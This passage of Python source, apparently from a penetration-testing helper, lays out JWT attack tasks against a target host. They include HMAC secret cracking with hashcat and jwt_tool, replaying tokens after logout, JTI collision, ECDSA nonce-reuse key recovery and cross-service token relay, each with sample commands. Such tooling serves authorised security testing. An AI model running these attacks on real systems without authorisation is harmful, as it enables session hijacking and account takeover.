                    'Check secret reuse in other services',
                    'For faster cracking, switch to hashcat with GPU'
                ],
                'alternatives': [
                    'Hashcat (faster): hashcat -a 0 -m 16500 <TOKEN> rockyou.txt',
                    'Custom wordlist: cat custom-words.txt | python3 jwt_tool.py <TOKEN> -C -d -',
                    'Small test wordlist: /usr/share/wordlists/fasttrack.txt (much faster)',
                    'Hybrid attack: Combine wordlist with rules for variations'
                ],
                'estimated_time': '30 minutes to several hours',
                'notes': 'jwt_tool is pure Python (slower than GPU tools). Use for quick tests with small wordlists or when hashcat unavailable. For serious cracking, use hashcat. Common weak secrets: secret, password, 123456, admin, key, jwt_secret.'
            }
        })

        tasks['children'].append(bruteforce_tasks)

        # PHASE 6: Token Expiry and Replay
        replay_tasks = {
            'id': f'jwt-replay-{port}',
            'name': 'Token Expiry and Replay Testing',
            'type': 'parent',
            'children': []
        }

        # Task 6.1: Check Expiration Enforcement
        replay_tasks['children'].append({
            'id': f'jwt-exp-check-{port}',
            'name': 'Test Token Expiration Enforcement',
            'type': 'manual',
            'metadata': {
                'description': 'Check if server enforces exp (expiration) claim in JWT tokens',
                'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                'success_indicators': [
                    'Expired token still accepted',
                    'No expiration validation',
                    'Token works indefinitely',
                    'exp claim ignored by server'
                ],
                'failure_indicators': [
                    'Token rejected after expiration',
                    'HTTP 401 with "token expired" message',
                    'Proper exp claim validation',
                    'New token required after expiry'
                ],
                'next_steps': [
                    'If exp not enforced: Document as security issue',
                    'Test long-term token replay (days/weeks later)',
                    'Check if token can be used for session hijacking',
                    'Verify if refresh token mechanism exists'
                ],
                'alternatives': [
                    'jwt_tool: python3 jwt_tool.py <TOKEN> -R (read token including exp timestamp)',
                    'Manual: Decode token at jwt.io, check exp claim (Unix timestamp)',
                    'Wait for expiry: Note exp time, wait, replay request',
                    'Modify exp: Change exp to past timestamp, check if rejected'
                ],
                'notes': 'exp claim is Unix timestamp (seconds since 1970). Convert: date -d @<timestamp>. Tokens without exp never expire (security risk). JTI (JWT ID) claim can prevent replay but has limits. If exp not validated, tokens work forever (session hijacking risk).'
            }
        })

        # Task 6.2: Token Replay Attack
        replay_tasks['children'].append({
            'id': f'jwt-replay-{port}',
            'name': 'JWT Replay Attack Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test if JWT tokens can be replayed after user logout or session termination',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'SESSION'],
                'success_indicators': [
                    'Token valid after logout',
                    'No token revocation mechanism',
                    'Old tokens continue working',
                    'Session persists after termination'
                ],
                'failure_indicators': [
                    'Token invalidated on logout',
                    'Token blacklist enforced',
                    'HTTP 401 after logout',
                    'Proper session management'
                ],
                'next_steps': [
                    'If replay successful: Test session hijacking',
                    'Save token before logout, replay after',
                    'Check if jti (JWT ID) tracked for revocation',
                    'Document lack of token revocation'
                ],
                'alternatives': [
                    'Burp Repeater: Save request with token, logout, replay request',
                    'curl: curl -H "Authorization: Bearer <OLD_TOKEN>" http://{target}:{port}/api/endpoint',
                    'Browser DevTools: Copy token, logout, manually add to new request',
                    'Test cross-session: Use token from one browser in another'
                ],
                'notes': 'JWTs are stateless (server doesn\'t track them). Without token blacklist/revocation, old tokens work until expiry. Test: 1) Login, save token 2) Logout 3) Replay token. If accepted, no revocation mechanism exists. jti claim enables tracking but requires server-side storage.'
            }
        })

        # Task 6.3: JTI Collision Attack
        replay_tasks['children'].append({
            'id': f'jwt-jti-collision-{port}',
            'name': 'JTI (JWT ID) Collision Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test if JTI has limited length allowing ID collision and replay attacks',
                'tags': ['OSCP:LOW', 'MANUAL', 'ADVANCED'],
                'success_indicators': [
                    'JTI has short max length (e.g., 4 digits)',
                    'ID collision possible after N requests',
                    'Can replay request with same JTI',
                    'JTI wraps around (0001->9999->0001)'
                ],
                'failure_indicators': [
                    'JTI uses UUID/long random string',
                    'No collision possible',
                    'JTI properly enforced as unique',
                    'Large JTI keyspace prevents collision'
                ],
                'next_steps': [
                    'If short JTI: Calculate collision point (e.g., 10000 requests)',
                    'Replay request after JTI wraps around',
                    'Test if server rejects duplicate JTI',
                    'Document insufficient JTI entropy'
                ],
                'alternatives': [
                    'Decode tokens: python3 jwt_tool.py <TOKEN> (check jti format)',
                    'Automate: Script to send N requests until JTI collision',
                    'Burp Intruder: Capture sequential tokens, analyze JTI pattern',
                    'Manual: Generate multiple tokens, compare JTI values'
                ],
                'notes': 'jti (JWT ID) prevents replay attacks by ensuring token uniqueness. If jti maxes at 9999, request 0001 and 10001 share same ID. Calculate collision: If jti=0001-9999, after 10000 requests, IDs repeat. Proper jti uses UUID (128-bit random) preventing collisions.'
            }
        })

        tasks['children'].append(replay_tasks)

        # PHASE 7: Advanced Attacks
        advanced_tasks = {
            'id': f'jwt-advanced-{port}',
            'name': 'Advanced JWT Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 7.1: ES256 Same Nonce Attack
        advanced_tasks['children'].append({
            'id': f'jwt-es256-nonce-{port}',
            'name': 'ES256 Private Key Recovery (Same Nonce)',
            'type': 'manual',
            'metadata': {
                'description': 'If ES256 algorithm reuses nonce in signatures, recover private key from two tokens',
                'tags': ['OSCP:LOW', 'ADVANCED', 'CRYPTO'],
                'success_indicators': [
                    'Two tokens with same nonce detected',
                    'Private key mathematically recoverable',
                    'ECDSA vulnerability exploited',
                    'Can forge arbitrary tokens'
                ],
                'failure_indicators': [
                    'Unique nonce per signature',
                    'Proper ECDSA implementation',
                    'Insufficient tokens for analysis',
                    'Different nonces used'
                ],
                'next_steps': [
                    'Collect multiple ES256 tokens',
                    'Extract r and s values from signatures',
                    'Use cryptographic tools to check nonce reuse',
                    'If same nonce found: Recover private key using ECDSA math'
                ],
                'alternatives': [
                    'Reference: https://asecuritysite.com/encryption/ecd5 (ECDSA nonce reuse)',
                    'Python script: Analyze signature components for nonce reuse',
                    'Check signatures: If r values identical, same nonce used',
                    'ECDSA calculator: Recover key from two signatures with same nonce'
                ],
                'notes': 'ECDSA (ES256) requires unique random nonce per signature. If nonce reused, private key can be calculated from two signatures. Very rare vulnerability, requires poor cryptographic implementation. Need at least 2 tokens signed with same nonce. Check if multiple tokens have identical r value in signature.'
            }
        })

        # Task 7.2: Cross-Service Relay Attack
        advanced_tasks['children'].append({
            'id': f'jwt-cross-service-{port}',
            'name': 'Cross-Service JWT Relay Attack',
            'type': 'manual',
            'metadata': {
                'description': 'Test if JWT from one service accepted by another service using same JWT provider',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'LATERAL'],
                'success_indicators': [
                    'Token from Service A accepted by Service B',
                    'Shared JWT signing key across services',
                    'No audience (aud) claim validation',
                    'Cross-service impersonation possible'
                ],
                'failure_indicators': [
                    'Token rejected by other service',
                    'aud claim validated',
                    'Service-specific secrets used',
                    'Proper token scoping'
                ],
                'next_steps': [
                    'If successful: Document cross-service token acceptance',
                    'Test impersonation across all services',
                    'Check if aud claim present and validated',
                    'Attempt privilege escalation via service hopping'
                ],
                'alternatives': [
                    'Identify JWT provider: Check iss (issuer) claim in token',
                    'Find other services: Search for same issuer in other applications',
                    'Test manually: Use token from App1 in App2 requests',
                    'Check aud claim: Decode token, verify audience validation'
                ],
                'notes': 'Some services use shared JWT provider for authentication. If aud (audience) claim not validated, token for ServiceA works on ServiceB. Attack: 1) Get token from ServiceA 2) Replay in ServiceB 3) If accepted, no audience validation. Proper defense: Validate aud claim matches service name.'
            }
        })

        tasks['children'].append(advanced_tasks)

        # PHASE 8: Research and Documentation
        research_tasks = {
            'id': f'jwt-research-{port}',
            'name': 'JWT Security Research',
            'type': 'parent',
            'children': []
        }

        # Task 8.1: JWT Library CVE Research
        research_tasks['children'].append({
            'id': f'jwt-cve-research-{port}',
            'name': 'Research JWT Library Vulnerabilities',
            'type': 'command',
            'metadata': {
                'command': f'searchsploit jwt',
                'description': 'Search for known vulnerabilities in JWT libraries and implementations',
                'tags': ['OSCP:MEDIUM', 'RESEARCH', 'QUICK_WIN'],
                'flag_explanations': {
                    'searchsploit': 'Offline exploit database search tool',
                    'jwt': 'Search keyword for JSON Web Token vulnerabilities'
                },
                'success_indicators': [
                    'Known JWT vulnerabilities found',
                    'Library-specific exploits discovered',
                    'CVEs matching target stack',
                    'PoC exploits available'
                ],
                'failure_indicators': [
                    'No results found',
                    'Exploits for different libraries/languages',
                    'Outdated/patched vulnerabilities'
                ],
                'next_steps': [
                    'Identify JWT library used by application (response headers, errors)',
                    'Search specific library: searchsploit "jsonwebtoken nodejs"',
                    'Research CVEs: CVE-2016-5431 (key confusion), CVE-2018-0114 (embedded key)',
                    'Check library versions for known vulnerabilities'
                ],
                'alternatives': [
                    'Online: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jwt',
                    'GitHub: Search "JWT vulnerability" for PoCs',
                    'jwt_tool wiki: https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits',
                    'Google: "JWT [library name] vulnerability CVE"'
                ],
                'estimated_time': '5-10 minutes',
                'notes': 'Common JWT CVEs: CVE-2016-5431 (RS256->HS256), CVE-2016-10555 (algorithm confusion), CVE-2018-0114 (jwk header injection). Identify library from error messages or server headers. Check GitHub issues for security advisories.'
            }
        })

        # Task 8.2: JWT Tools Reference
        research_tasks['children'].append({
            'id': f'jwt-tools-reference-{port}',
            'name': 'JWT Testing Tools Reference',
            'type': 'manual',
            'metadata': {
                'description': 'Reference guide for JWT security testing tools and resources',
                'tags': ['OSCP:MEDIUM', 'REFERENCE', 'MANUAL'],
                'alternatives': [
                    'jwt_tool: https://github.com/ticarpi/jwt_tool (comprehensive JWT testing)',
                    'Burp Extensions: JSON Web Tokens, JOSEPH, SignSaboteur',
                    'jwt.io: https://jwt.io (online decoder/encoder)',
                    'hashcat mode 16500: JWT HMAC secret cracking',
                    'c-jwt-cracker: https://github.com/brendan-rius/c-jwt-cracker (fast cracking)',
                    'JWT_Tool wiki: https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology'
                ],
                'notes': 'Essential JWT testing tools: 1) jwt_tool (Python, all attacks), 2) Burp extensions (GUI testing), 3) hashcat (GPU cracking), 4) jwt.io (manual analysis). Install jwt_tool: git clone https://github.com/ticarpi/jwt_tool; pip3 install pycryptodomex. Burp: Extender > BApp Store > JSON Web Tokens, JOSEPH, SignSaboteur.'
            }
        })

        tasks['children'].append(research_tasks)

        return tasks
